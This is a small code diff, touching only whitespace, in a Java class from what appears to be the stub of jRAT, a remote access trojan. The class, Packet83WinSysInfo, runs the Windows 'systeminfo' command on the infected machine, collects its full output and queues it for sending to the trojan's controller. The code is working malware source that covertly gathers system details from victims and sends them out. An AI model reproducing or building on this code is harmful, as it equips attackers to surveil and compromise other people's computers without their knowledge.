@@ -7,8 +7,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet57RawComputerInfo;
 
-
-
 public class Packet83WinSysInfo extends AbstractIncomingPacket {
 
 	@Override
@@ -16,14 +14,14 @@ public class Packet83WinSysInfo extends AbstractIncomingPacket {
 		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 			Process p = Runtime.getRuntime().exec("systeminfo");
 			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-			
+
 			String info = "";
 			String line;
 
 			while ((line = reader.readLine()) != null) {
 				info += line + "\n";
 			}
-			
+
 			Connection.addToSendQueue(new Packet57RawComputerInfo(info));
 		}
 	}
